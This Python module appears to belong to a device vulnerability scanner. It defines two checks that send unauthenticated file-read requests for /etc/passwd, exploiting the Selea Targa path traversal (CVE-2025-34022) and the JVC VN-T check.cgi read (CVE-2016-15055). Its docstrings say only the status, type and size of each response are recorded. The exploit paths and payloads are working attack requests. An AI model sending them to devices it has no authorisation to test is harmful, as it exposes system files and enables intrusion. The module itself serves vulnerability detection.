"""The two unauthenticated file reads of the batch: a file, not a picture.

Both return the contents of a file the device should never have served. Neither
is an image, so the honest outcome of both is a recorded `no_frame` naming what
came back, which is exactly what the `cve_finding` constraint is for (D31).

The bytes are never kept: the reason carries the status, the type and the size,
never the file, so a read of `/etc/passwd` does not land in the database.

The exact syntax of both calls is a `NEEDS CLARIFICATION` of research R5, so
each class tries the shapes the sources name and records which one answered.
"""

from models.finding import CveClass
from scanners.cve.base import CveTarget, ImageAttempt, ReadMethod, ReadRequest

# The file both classes ask for: readable by anyone on the device, so a 200 is
# proof of the read and not of a permission mistake. Nothing is stored from it.
_PROOF_FILE = "/etc/passwd"
_FORM_CONTENT_TYPE = "application/x-www-form-urlencoded"


class SeleaFileRead(ImageAttempt):
    """The Selea Targa path traversal (CVE-2025-34022).

    The sources disagree on the path, so both are tried: the advisory names the
    POST under `/cgi-bin`, and the published proof uses `/common`.
    """

    _POST_PATH = "/cgi-bin/get_file.php"
    _GET_PATH = "/common/get_file.php"

    @property
    def cve_ids(self) -> tuple[str, ...]:
        return ("CVE-2025-34022",)

    @property
    def cve_class(self) -> CveClass:
        return CveClass.unauth_read

    def _requests_for(self, target: CveTarget, port: int) -> tuple[ReadRequest, ...]:
        return (
            ReadRequest(
                method=ReadMethod.form_post,
                url=target.url(port, self._POST_PATH),
                body=f"files_list={_PROOF_FILE}",
                content_type=_FORM_CONTENT_TYPE,
            ),
            ReadRequest(
                method=ReadMethod.get,
                url=target.url(port, f"{self._GET_PATH}?files_list={_PROOF_FILE}"),
            ),
        )


class JvcFileRead(ImageAttempt):
    """The JVC VN-T file read (CVE-2016-15055).

    The `file` parameter is the whole of it, and the parameter syntax is the
    open question of R5, so the query form is what is sent.
    """

    _PATH = "/check.cgi"

    @property
    def cve_ids(self) -> tuple[str, ...]:
        return ("CVE-2016-15055",)

    @property
    def cve_class(self) -> CveClass:
        return CveClass.unauth_read

    def _requests_for(self, target: CveTarget, port: int) -> tuple[ReadRequest, ...]:
        return (
            ReadRequest(
                method=ReadMethod.get,
                url=target.url(port, f"{self._PATH}?file={_PROOF_FILE}"),
            ),
        )
